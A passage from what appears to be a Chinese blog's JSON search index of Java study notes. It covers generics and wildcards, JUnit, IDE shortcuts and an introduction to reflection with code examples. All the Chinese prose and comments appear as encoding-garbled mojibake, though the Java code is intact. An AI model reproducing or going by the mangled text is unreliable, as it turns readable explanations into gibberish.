//å…ˆæŒ‰ç…§nameæ’åºï¼Œå¦‚æœnameç›¸åŒï¼Œåˆ™æŒ‰ç”Ÿæ—¥æ—¥æœŸçš„å…ˆåæ’åºã€‚ã€å³ï¼šå®šåˆ¶æ’åºã€‘\n            //å…ˆå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒéªŒè¯\n            if (!(emp1 instanceof Employee && emp2 instanceof Employee)) {\n                System.out.println(\"ç±»å‹ä¸æ­£ç¡®..\");\n                return 0;\n            }\n            //æ¯”è¾ƒname\n            int i = emp1.getName().compareTo(emp2.getName());\n            if (i != 0) {\n                return i;\n            }\n            //å°è£…åï¼Œå°†æ¥å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ï¼Œå°±å¤§å¤§å¢å¼º.\n            return emp1.getBirthday().compareTo(emp2.getBirthday());\n        }\n        });\n        System.out.println(\"==å¯¹é›‡å‘˜è¿›è¡Œæ’åº==\");\n        System.out.println(employees);\n    }\n}\n```\n\n### æ³›å‹çš„ç»§æ‰¿å’Œé€šé…ç¬¦\n\n- æ³›å‹ä¸å…·å¤‡ç»§æ‰¿æ€§\n\n  ```java\n  //Objectæ˜¯Stringçš„çˆ¶ç±»\n  Object o = new String(\"xx\");//æ­£ç¡®\n  List<Object> list = new ArrayList <String>; //é”™è¯¯\n  ```\n\n- é€šé…ç¬¦\n\n  - `<?>` :æ”¯æŒä»»æ„æ³›å‹ç±»å‹\n\n  - `<? extends A>`:æ”¯æŒAç±»ä»¥åŠAç±»çš„å­ç±»ï¼Œè§„å®šäº†æ³›å‹çš„ä¸Šé™\n\n  - `<? super A>`:æ”¯æŒAç±»ä»¥åŠAç±»çš„çˆ¶ç±»ï¼Œä¸é™äºç›´æ¥çˆ¶ç±»ï¼Œè§„å®šäº†æ³›å‹çš„ä¸‹é™\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class GenericExtends {\n    public static void main(String[] args) {\n        \n        List<Object> list1 = new ArrayList<>();\n        List<String> list2 = new ArrayList<>();\n        List<AA> list3 = new ArrayList<>();\n        List<BB> list4 = new ArrayList<>();\n        List<CC> list5 = new ArrayList<>();\n        \n        //å¦‚æœæ˜¯List<?> c ï¼Œå¯ä»¥æ¥å—ä»»æ„çš„æ³›å‹ç±»å‹\n        printCollection1(list1);\n        printCollection1(list2);\n        printCollection1(list3);\n        printCollection1(list4);\n        printCollection1(list5);\n        \n        //List<? extends AA> cï¼š è¡¨ç¤ºä¸Šé™ï¼Œå¯ä»¥æ¥å—AA æˆ–è€…AA å­ç±»\n        printCollection2(list1);//Ã—\n        printCollection2(list2);//Ã—\n        printCollection2(list3);//âˆš\n        printCollection2(list4);//âˆš\n        printCollection2(list5);//âˆš\n\n        //List<? super AA> c: æ”¯æŒAA ç±»ä»¥åŠAA ç±»çš„çˆ¶ç±»ï¼Œä¸é™äºç›´æ¥çˆ¶ç±»\n        printCollection3(list1);//âˆš\n        printCollection3(list2);//Ã—\n        printCollection3(list3);//âˆš\n        printCollection3(list4);//Ã—\n        printCollection3(list5);//Ã—\n\n    }\n\n    \n    //è¯´æ˜: List<?> è¡¨ç¤ºä»»æ„çš„æ³›å‹ç±»å‹éƒ½å¯ä»¥æ¥å—\n    public static void printCollection1(List<?> c) {\n        for (Object object : c) { // é€šé…ç¬¦ï¼Œå–å‡ºæ—¶ï¼Œå°±æ˜¯Object\n            System.out.println(object);\n        }\n    }\n    \n    // ? extends ï¼Œå¯ä»¥æ¥å—AA æˆ–è€…AA å­ç±»\n    public static void printCollection2(List<? extends AA> c) {\n        for (Object object : c) {\n            System.out.println(object);\n        }\n    }\n    \n    // ? superï¼Œæ”¯æŒAA ç±»ä»¥åŠAA ç±»çš„çˆ¶ç±»ï¼Œä¸é™äºç›´æ¥çˆ¶ç±»ï¼Œ\n    public static void printCollection3(List<? super AA> c) {\n        for (Object object : c) {\n            System.out.println(object);\n        }\n    }\n}\n\nclass AA {\n}\n\nclass BB extends AA {\n}\n\nclass CC extends BB {\n}\n```\n\n- [java æ³›å‹å…¨è§£ - ç»å¯¹æœ€è¯¦ç»† - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844903925666021389)\n\n## æ­£åˆ™\n\nã€‚ã€‚ã€‚\n\n## å…¶ä»–\n\n### ç±»å‹è½¬æ¢\n\n- new String(char[])ï¼šå°†char[]è½¬æ¢æˆString\n- new String(char[],off,len)ï¼šå°†char[]çš„æŒ‡å®šéƒ¨åˆ†è½¬æ¢æˆString\n- str.toCharArray()ï¼šå°†Stringè½¬æ¢æˆchar[]\n- Integer.parseInt(str)ï¼šå°†Stringè½¬æ¢æˆint\n\n### Junit\n\n- 1.ä¸€ä¸ªç±»æœ‰å¾ˆå¤šåŠŸèƒ½ä»£ç éœ€è¦æµ‹è¯•ï¼Œ ä¸ºäº†æµ‹è¯•ï¼Œå°±éœ€è¦å†™å…¥åˆ°mainæ–¹æ³•ä¸­\n- 2.å¦‚æœæœ‰å¤šä¸ªåŠŸèƒ½ä»£ç æµ‹è¯•ï¼Œå°±éœ€è¦æ¥å›æ³¨é”€ï¼Œåˆ‡æ¢å¾ˆéº»çƒ¦\n- 3.å¦‚æœå¯ä»¥ç›´æ¥è¿è¡Œä¸€ä¸ªæ–¹æ³•ï¼Œå°±æ–¹ä¾¿å¾ˆå¤šï¼Œå¹¶ä¸”å¯ä»¥ç»™å‡ºç›¸å…³ä¿¡æ¯ï¼Œå°±å¥½äº†\n\nJUnitæ˜¯ä¸€ä¸ªJavaè¯­è¨€çš„å•å…ƒæµ‹è¯•æ¡†æ¶ï¼Œå¤šæ•°Javaçš„å¼€å‘ç¯å¢ƒéƒ½å·²ç»é›†æˆäº†JUnitä½œä¸ºå•å…ƒæµ‹è¯•çš„å·¥å…·\n\n#### ä¼ ç»Ÿæ–¹æ³•\n\n```java\npackage com.jwt.generic;\n\npublic class JUnit_ {\n    public static void main(String[] args) {\n        //ä¼ ç»Ÿæ–¹å¼\n        new JUnit_().m1();\n        new JUnit_().m2();\n    }\n  \n    public void m1 () {\n        System.out.println(\"m1 æ–¹æ³•è¢«è°ƒç”¨\");\n    }\n  \n    public void m2 () {\n        System.out.println(\"m2 æ–¹æ³•è¢«è°ƒç”¨\");\n    }\n}\n```\n\n#### ä½¿ç”¨JUnit\n\n```java\npackage com.jwt.generic;\n\npublic class JUnit_ {\n  \n    @Test\n    public void m1 () {\n        System.out.println(\"m1 æ–¹æ³•è¢«è°ƒç”¨\");\n    }\n  \n    @Test\n    public void m2 () {\n        System.out.println(\"m2 æ–¹æ³•è¢«è°ƒç”¨\");\n    }\n}\n```\n\n### å¿«æ·æ“ä½œ\n\n#### æ·»åŠ æ„é€ å‡½æ•°\n\nMacï¼šCtrl + enter\n\nWinï¼šAIt + Inster\n\n#### è‡ªåŠ¨å¯¼åŒ…\n\né¦–å…ˆè¿›å…¥è®¾ç½®é€‰é¡¹-->ç¼–è¾‘å™¨-->å¸¸è§„-->è‡ªåŠ¨å¯¼åŒ…-->å‹¾é€‰å¯¹åº”é¡¹\n\n#### åŒ…å›´ä»£ç \n\nä½¿ç”¨if..else, try..catch, for, synchronizedç­‰åŒ…å›´é€‰ä¸­çš„ä»£ç \n\nWinï¼šCtrl + Alt + t\n\nMacï¼šoption + command + t \n\n#### é€‰æ‹©å¯¼åŒ…\n\nWinï¼šAlt + enter\n\nMacï¼šoption + enter\n\n#### è¡¥å…¨æ‹¬å·æˆ–è€…åˆ†å·\n\nShift + command + enter\n\n#### æ˜¾ç¤ºæ‰€æœ‰çš„å¿«æ·é”®\n\nWinï¼šCtrl + j\n\nMacï¼šCommand + j\n\n#### å¿«æ·ç”Ÿæˆä»£ç \n\nå¿«é€Ÿç”Ÿæˆæ‰“å°ï¼šsout\n\nå¿«é€Ÿç”Ÿæˆæ‰“å°å½“å‰å€¼ï¼šsoutv\n\nå¿«é€Ÿç”Ÿæˆå¢å¼ºforï¼šI\n\nå¿«é€Ÿç”Ÿæˆmainæ–¹æ³•ï¼šmain\n\nå¿«é€Ÿç”Ÿæˆè¿­ä»£å™¨whileï¼šè¾“å…¥ itit\n\n#### å¤šè¡Œæ“ä½œ\n\nWinï¼šAIt+é¼ æ ‡å·¦é”®ä¸æ”¾ï¼Œæ‹–åŠ¨å³å¯\n\nMacï¼šoption+é¼ æ ‡å·¦é”®ä¸æ”¾ï¼Œæ‹–åŠ¨å³å¯\n\n#### è½¬åˆ°ä»»æ„ç±»\n\nWinï¼šCtrl+Shift+t\n\nMacï¼šCommand+o\n\n#### æœç´¢ç±»ä¸­çš„æ–¹æ³•\n\nWinï¼šCtrl+F12\n\nMacï¼šCommand+F12\n\n#### ä»£ç ä¸Šä¸‹ç§»åŠ¨\n\nWinï¼šCtrl+Shift+â†‘/â†“\n\nMacï¼šCommand+Shift+â†‘/â†“\n\n#### æŸ¥çœ‹å‡½æ•°å‚æ•°\n\nWinï¼šCtrl+p\n\nMacï¼šCommand+p\n\n#### å¤§å°å†™è½¬æ¢\n\nWinï¼šCtrl+Shift+u\n\nMacï¼šCommand+Shift+u\n\n#### å°è£…ä»£ç æˆæ–¹æ³•\n\nWinï¼šCtrl+Alt+m\n\nMacï¼šCommand+option+m\n\n### æºç å‡½æ•°å›é€€\n\nWinï¼šCtrl+Alt+â†’/â†\n\nMacï¼šCommand+option+â†’/â†\n\n### ç»Ÿä¸€ä¿®æ”¹ä»£ç \n\nWinï¼šShift+F6\n\nMacï¼šShift+F6\n\n### éšè—æŒ‡å®šæ–‡ä»¶\n\n1. ã€Filesã€‘â†’ã€Settingsã€‘\n2. ã€Editorã€‘â†’ã€File Typesã€‘â†’ã€Ignored Files and Foldersã€‘\n3. è¾“å…¥è¦éšè—çš„åç§°ï¼Œæ”¯æŒ*å·é€šé…ç¬¦\n4. å›è½¦ç¡®è®¤æ·»åŠ \n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å­¦ä¹ ç¬”è®°"],"categories":["JavaSE"]},{"title":"Java-åå°„","url":"/posts/13406.html","content":"\n## å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-åå°„ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡3å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-06\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-09\n- [x] ğŸ€æ€»ç»“ï¼šç”¨æ—¶4å¤©ï¼Œä½†å®é™…ç”¨æ—¶æ˜¯2å¤©ï¼Œä¸­é—´ä¸¤å¤©åœ¨çœ‹è®ºæ–‡ï¼Œæ²¡æœ‰æ›´æ–°\n\n## åå°„å¼•å‡º\n\n### ä¸€ä¸ªéœ€æ±‚\n\næ ¹æ®é…ç½®æ–‡ä»¶ re.properties æŒ‡å®šä¿¡æ¯ï¼Œåˆ›å»º Cat å¯¹è±¡å¹¶è°ƒç”¨æ–¹æ³• hi\n\n```\nclassfullpath=com.jwt.Cat\nmethod=hi\n```\n\nè¿™æ ·çš„éœ€æ±‚åœ¨å­¦ä¹ æ¡†æ¶æ—¶å¾ˆå¤šï¼Œ**å³åœ¨é€šè¿‡å¤–éƒ¨æ–‡ä»¶é…ç½®ï¼Œåœ¨ä¸ä¿®æ”¹æºç çš„æƒ…å†µä¸‹ï¼Œæ¥æ§åˆ¶ç¨‹åº**ã€‚\n\n### ä¼ ç»Ÿæ–¹æ³•\n\nä¼ ç»Ÿçš„æ–¹æ³•æ˜¯å…ˆ new ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨å®ƒçš„æ–¹æ³•ã€‚\n\n```java\nCat cat = new Cat();\ncat.hi();\n```\n\né€šè¿‡ä¼ ç»Ÿæ–¹æ³•ï¼Œç¡®å®å¯ä»¥è°ƒç”¨ hi() æ–¹æ³•ï¼Œä½†æ˜¯è¿™å’Œæˆ‘ä»¬çš„éœ€æ±‚ä¸ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯è¦æ ¹æ®é…ç½®æ–‡ä»¶ re.properties æŒ‡å®šä¿¡æ¯æ¥å®Œæˆã€‚å¯ä»¥ä½¿ç”¨ Properties æ¥è¯»å–é…ç½®æ–‡ä»¶ã€‚\n\n```java\nProperties properties = new Properties();\nproperties.load(new FileInputStream(\"src//re.properties\"));\nString classfullpath = properties.getProperty(\"classfullpath\");//\"com.jwt.Cat\"\nString methodName = properties.getProperty(\"method\");//\"hi\"\nSystem.out.println(\"classfullpath=\" + classfullpath);\nSystem.out.println(\"method=\" + methodName);\n```\n\nç„¶åéœ€è¦åˆ›å»ºå¯¹è±¡ï¼Œæ€ä¹ˆåˆ›å»ºå¯¹è±¡å‘¢ï¼Ÿç›´æ¥`new classfullpath`ï¼Œè¿™æ ·ä¸å°±å¥½äº†å˜›ï¼Ÿå—¯ï¼Œæƒ³æ³•ä¸é”™ï¼Œä¸‹å›ä¸è¦æƒ³äº†ã€‚ç°åœ¨çš„ classfullpath å¯æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ€ä¹ˆèƒ½å»`new`å‘¢ã€‚æ‰€ä»¥ç°æœ‰æŠ€æœ¯æ˜¯åšä¸åˆ°è¿™ä¸ªäº‹æƒ…çš„ã€‚é‚£ä¹ˆè¿™é‡Œå°±è¦å¼•å…¥æˆ‘ä»¬è¦å°†çš„é‡ç‚¹â€”â€”åå°„æœºåˆ¶ã€‚\n\n### åå°„æ–¹æ³•\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.FileInputStream;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\npublic class ReflectionQuestion {\n    public static void main(String[] args) throws Exception {\n        //1. ä½¿ç”¨Properties ç±», å¯ä»¥è¯»å–é…ç½®æ–‡ä»¶\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//re.properties\"));\n        String classfullpath = properties.getProperty(\"classfullpath\");//\"com.jwt.Cat\"\n        String methodName = properties.getProperty(\"method\");//\"hi\"\n        System.out.println(\"classfullpath=\" + classfullpath);\n        System.out.println(\"method=\" + methodName);\n      \n        //2. ä½¿ç”¨åå°„æœºåˆ¶è§£å†³\n        //(1) åŠ è½½ç±», è¿”å›Classç±»å‹çš„å¯¹è±¡cls\n        Class cls = Class.forName(classfullpath);\n        System.out.println(\"cls = \" + cls);\n        //(2) é€šè¿‡clså¾—åˆ°ä½ åŠ è½½çš„ç±»com.jwt.Catçš„å¯¹è±¡å®ä¾‹\n        Object o = cls.newInstance();\n        System.out.println(\"o çš„è¿è¡Œç±»å‹=\" + o.getClass()); //è¿è¡Œç±»å‹\n        //(3) é€šè¿‡clså¾—åˆ°ä½ åŠ è½½çš„ç±»com.jwt.Catçš„methodName \"hi\" çš„æ–¹æ³•å¯¹è±¡\n        Method method = cls.getMethod(methodName);\n        //(4) é€šè¿‡method è°ƒç”¨æ–¹æ³•: å³é€šè¿‡æ–¹æ³•å¯¹è±¡æ¥å®ç°è°ƒç”¨æ–¹æ³•\n        method.invoke(o); //ä¼ ç»Ÿæ–¹æ³•å¯¹è±¡.æ–¹æ³•() , åå°„æœºåˆ¶ï¼šæ–¹æ³•.invoke(å¯¹è±¡)\n    }\n}\n```\n\nåå°„æœºåˆ¶è¿˜æœ‰ä¸€ä¸ªä¼˜ç‚¹ï¼Œé‚£å°±æ˜¯å¯ä»¥é€šè¿‡å¤–éƒ¨æ–‡ä»¶é…ç½®ï¼Œåœ¨ä¸ä¿®æ”¹æºç çš„æƒ…å†µä¸‹ï¼Œæ¥æ§åˆ¶ç¨‹åºã€‚æ¯”å¦‚è¿™é‡Œï¼Œæˆ‘åœ¨Cat ç±»ä¸‹é¢å†å†™ä¸€ä¸ªæ–¹æ³•ï¼Œcry()æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¼ ç»Ÿæ–¹æ³•ï¼Œè¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ˜¯ä¸æ˜¯å°±è¦ä¿®æ”¹ä»£ç äº†ï¼Œæ¯”å¦‚`cat.cry(); `é€šè¿‡åå°„ï¼Œåªéœ€åœ¨é…ç½®æ–‡ä»¶ re.properties ä¸­ï¼Œå°† method=hi æ”¹ä¸º method=cry å°±å¯ä»¥äº†ã€‚\n\n## åå°„æ˜¯ä»€ä¹ˆ\n\n### ç®€ä»‹\n\n- åå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨æ‰§è¡Œæ—¶å€ŸåŠ©äº Reflection API å–å¾—ä»»ä½•ç±»çš„å†…éƒ¨ä¿¡æ¯(æ¯”å¦‚æˆå‘˜å˜é‡ï¼Œæ„é€ å™¨ï¼Œæˆå‘˜æ–¹æ³•ç­‰ç­‰)ï¼Œå¹¶èƒ½æ“ä½œå¯¹è±¡çš„å±æ€§åŠæ–¹æ³•ã€‚\n\n- åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰â½…æ³•(åŒ…æ‹¬ç§æœ‰)ï¼Œæ‹¿åˆ°çš„â½…æ³•å¯ä»¥è°ƒâ½¤ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­â¾”é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚\n\n- åŠ è½½å®Œç±»ä¹‹åï¼Œåœ¨å †ä¸­å°±äº§ç”Ÿäº†ä¸€ä¸ª Class ç±»å‹çš„å¯¹è±¡(ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡) ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«äº†ç±»çš„å®Œæ•´ç»“æ„ä¿¡æ¯ã€‚é€šè¿‡è¿™ä¸ªå¯¹è±¡å¾—åˆ°ç±»çš„ç»“æ„ã€‚è¿™ä¸ª Class å¯¹è±¡å°±åƒä¸€é¢é•œå­ï¼Œé€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥ï¼Œå½¢è±¡çš„ç§°ä¹‹ä¸ºåå°„\n\n**ä¸€å¥è¯æ€»ç»“ï¼šåå°„å°±æ˜¯åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“è¦æ“ä½œçš„ç±»æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„å®Œæ•´æ„é€ ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚åŠ¨æ€ç‰¹æ€§**\n\n### åå°„æœºåˆ¶åŸç†ç¤ºæ„\n\n![](https://img.jwt1399.top/img/image-20220406162500383.png)\n\n### åå°„æœºåˆ¶å¯ä»¥å®Œæˆ\n\n- 1.åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸ªå¯¹è±¡æ‰€å±çš„ç±»\n- 2.åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡\n- 3.åœ¨è¿è¡Œæ—¶å¾—åˆ°ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•\n- 4.åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•\n- 5.ç”ŸæˆåŠ¨æ€ä»£ç†\n\n### åå°„ç›¸å…³çš„ä¸»è¦ç±»\n\n- java.lang.Classï¼šä»£è¡¨ä¸€ä¸ªç±»ï¼ŒClass å¯¹è±¡è¡¨ç¤ºæŸ ä¸ªç±»åŠ è½½ååœ¨å †ä¸­çš„å¯¹è±¡\n\n- java.lang.reflect.Methodï¼šä»£è¡¨ç±»çš„æ–¹æ³•ï¼ŒMethod å¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æ–¹æ³•\n- java.lang.reflect.Fieldï¼šä»£è¡¨ç±»çš„æˆå‘˜å˜é‡ï¼ŒField å¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æˆå‘˜å˜é‡\n- java.lang.reflect.Constructorï¼šä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•ï¼ŒConstructor å¯¹è±¡è¡¨ç¤ºæ„é€ å™¨\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.FileInputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\npublic class Reflection01 {\n    public static void main(String[] args) throws Exception {\n        //1. ä½¿ç”¨Properties ç±», å¯ä»¥è¯»å†™é…ç½®æ–‡ä»¶\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//re.properties\"));\n        String classfullpath = properties.get(\"classfullpath\").toString();\n        String methodName = properties.get(\"method\").toString();\n        //2. ä½¿ç”¨åå°„æœºåˆ¶è§£å†³\n        //(1) åŠ è½½ç±», è¿”å›Class ç±»å‹çš„å¯¹è±¡cls\n        Class cls = Class.forName(classfullpath);\n        //(2) é€šè¿‡cls å¾—åˆ°ä½ åŠ è½½çš„ç±»com.hspedu.Cat çš„å¯¹è±¡å®ä¾‹\n        Object o = cls.newInstance();\n        System.out.println(\"o çš„è¿è¡Œç±»å‹=\" + o.getClass()); //è¿è¡Œç±»å‹\n        //java.lang.reflect.Methodï¼šä»£è¡¨ç±»çš„æ–¹æ³•ï¼ŒMethod å¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æ–¹æ³•\n        Method method = cls.getMethod(methodName);\n        //é€šè¿‡method è°ƒç”¨æ–¹æ³•: å³é€šè¿‡æ–¹æ³•å¯¹è±¡æ¥å®ç°è°ƒç”¨æ–¹æ³•\n        method.invoke(o);\n\n        //java.lang.reflect.Field: ä»£è¡¨ç±»çš„æˆå‘˜å˜é‡, Field å¯¹è±¡è¡¨ç¤ºæŸä¸ªç±»çš„æˆå‘˜å˜é‡\n        //getField ä¸èƒ½å¾—åˆ°ç§æœ‰çš„å±æ€§\n        Field nameField = cls.getField(\"name\");\n        System.out.println(nameField.get(o)); // ä¼ ç»Ÿå†™æ³•å¯¹è±¡.æˆå‘˜å˜é‡, åå°„: æˆå‘˜å˜é‡å¯¹è±¡.get(å¯¹è±¡)\n\n        //java.lang.reflect.Constructor: ä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•, Constructor å¯¹è±¡è¡¨ç¤ºæ„é€ å™¨\n        Constructor constructor = cls.getConstructor(); //()ä¸­å¯ä»¥æŒ‡å®šæ„é€ å™¨å‚æ•°ç±»å‹, è¿”å›æ— å‚æ„é€ å™¨\n        System.out.println(constructor);//Cat()\n        Constructor constructor2 = cls.getConstructor(String.class); //è¿™é‡Œä¼ å…¥çš„String.class å°±æ˜¯String ç±»çš„Class å¯¹è±¡\n        System.out.println(constructor2);//Cat(String name)\n    }\n}\n\n```\n\n### åå°„ä¼˜ç‚¹å’Œç¼ºç‚¹\n\n- ä¼˜ç‚¹ï¼šå¯ä»¥åŠ¨æ€çš„åˆ›å»ºå’Œä½¿ç”¨å¯¹è±¡(ä¹Ÿæ˜¯æ¡†æ¶åº•å±‚æ ¸å¿ƒ)ï¼Œä½¿ç”¨çµæ´»æ²¡æœ‰åå°„æœºåˆ¶ï¼Œæ¡†æ¶æŠ€æœ¯å°±å¤±å»åº•å±‚æ”¯æ’‘ã€‚\n- ç¼ºç‚¹ï¼šä½¿ç”¨åå°„åŸºæœ¬æ˜¯è§£é‡Šæ‰§è¡Œï¼Œå¯¹æ‰§è¡Œé€Ÿåº¦æœ‰å½±å“.\n\n**åå°„è°ƒç”¨ä¼˜åŒ–-å…³é—­è®¿é—®æ£€æŸ¥**\n\n- Methodã€Fieldã€ Constructor å¯¹è±¡éƒ½æœ‰ setAccessible() æ–¹æ³•\n- setAccessible ä½œç”¨æ˜¯å¯åŠ¨å’Œç¦ç”¨è®¿é—®å®‰å…¨æ£€æŸ¥çš„å¼€å…³\n  - å‚æ•°å€¼ä¸º true è¡¨ç¤ºåå°„çš„å¯¹è±¡åœ¨ä½¿ç”¨æ—¶å–æ¶ˆè®¿é—®æ£€æŸ¥ï¼Œæé«˜åå°„çš„æ•ˆç‡ã€‚\n  - å‚æ•°å€¼ä¸º false åˆ™è¡¨ç¤ºåå°„çš„å¯¹è±¡æ‰§è¡Œè®¿é—®æ£€æŸ¥\n\n```java\npackage com.jwt.reflection;\n\nimport com.jwt.Cat;\nimport java.lang.reflect.Method;\n\npublic class Reflection02 {\n    public static void main(String[] args) throws Exception {\n        m1();//ä¼ ç»Ÿ\n        m2();//åå°„\n        m3();//åå°„ä¼˜åŒ–\n    }\n\n    //ä¼ ç»Ÿæ–¹æ³•æ¥è°ƒç”¨hi\n    public static void m1() {\n        Cat cat = new Cat();\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            cat.hi();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m1() è€—æ—¶=\" + (end - start)+\"ms\");\n    }\n\n\n    //åå°„æœºåˆ¶è°ƒç”¨æ–¹æ³•hi\n    public static void m2() throws Exception {\n        Class cls = Class.forName(\"com.jwt.Cat\");\n        Object o = cls.newInstance();\n        Method hi = cls.getMethod(\"hi\");\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            hi.invoke(o);//åå°„è°ƒç”¨æ–¹æ³•\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m2() è€—æ—¶=\" + (end - start)+\"ms\");\n    }\n\n    //åå°„è°ƒç”¨ä¼˜åŒ–+ å…³é—­è®¿é—®æ£€æŸ¥\n    public static void m3() throws Exception {\n        Class cls = Class.forName(\"com.jwt.Cat\");\n        Object o = cls.newInstance();\n        Method hi = cls.getMethod(\"hi\");\n        hi.setAccessible(true);//åœ¨åå°„è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå–æ¶ˆè®¿é—®æ£€æŸ¥\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 900000000; i++) {\n            hi.invoke(o);//åå°„è°ƒç”¨æ–¹æ³•\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"m3() è€—æ—¶=\" + (end - start)+\"ms\");\n    }\n}\n/**\nm1() è€—æ—¶=2ms\nm2() è€—æ—¶=934ms\nm3() è€—æ—¶=769ms\n**/\n```\n\n## Class ç±»\n\n### åŸºæœ¬ä»‹ç»\n\n![](https://img.jwt1399.top/img/image-20220406170726054.png)\n\n1. Class ä¹Ÿæ˜¯ç±»ï¼Œç»§æ‰¿ Object ç±»\n2. Class ç±»å¯¹è±¡ä¸æ˜¯ new å‡ºæ¥çš„ï¼Œè€Œæ˜¯ç³»ç»Ÿåˆ›å»ºçš„\n3. å¯¹äºæŸä¸ªç±»çš„ Class ç±»å¯¹è±¡ï¼Œåœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œå› ä¸ºç±»åªåŠ è½½ä¸€ æ¬¡\n4. æ¯ä¸ªç±»çš„å®ä¾‹éƒ½ä¼šè®°å¾—è‡ªå·±æ˜¯ç”±å“ªä¸ª Class å®ä¾‹æ‰€ç”Ÿæˆ\n5. é€šè¿‡ Class å¯¹è±¡å¯ä»¥å®Œæ•´åœ°å¾—åˆ°ä¸€ä¸ªç±»çš„å®Œæ•´ç»“æ„\n6. Class 